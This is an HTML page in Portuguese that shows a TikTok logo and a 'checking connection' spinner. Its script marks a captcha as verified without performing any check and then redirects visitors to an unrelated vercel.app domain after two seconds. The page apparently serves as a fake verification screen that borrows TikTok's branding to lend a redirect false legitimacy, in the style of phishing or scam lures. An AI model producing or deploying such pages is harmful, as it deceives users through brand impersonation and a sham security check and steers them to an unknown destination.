<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificando Conexão</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: #ffffff;
      border-radius: 18px;
      padding: 35px 30px;
      width: 320px;
      text-align: center;
      box-shadow: 0 15px 40px rgba(0,0,0,0.4);
      animation: fadeIn 0.6s ease;
    }

    .logo {
      width: 90px;
      height: 90px;
      border-radius: 22px;
      background: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 18px;
      box-shadow: 0 0 25px rgba(255, 0, 80, 0.4);
    }

    .logo img {
      width: 60px;
      height: 60px;
    }

    h2 {
      margin: 0 0 8px;
      font-size: 20px;
      color: #111;
    }

    p {
      margin: 0;
      font-size: 15px;
      color: #555;
    }

    .loader {
      margin: 22px auto 0;
      width: 40px;
      height: 40px;
      border: 4px solid #e0e0e0;
      border-top: 4px solid #ff0050;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(15px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="logo">
      <img src="https://i.postimg.cc/HkKvNCQw/image.png" alt="TikTok">
    </div>

    <h2>Verificando conexão</h2>
    <p>Aguarde enquanto validamos o acesso…</p>

    <div class="loader"></div>
  </div>

  <script>
    // Marca como verificado
    sessionStorage.setItem('captchaVerified', 'true');

    // Redireciona após 2 segundos
    setTimeout(() => {
      window.location.href = "https://chutee.vercel.app";
    }, 2000);
  </script>

</body>
</html>
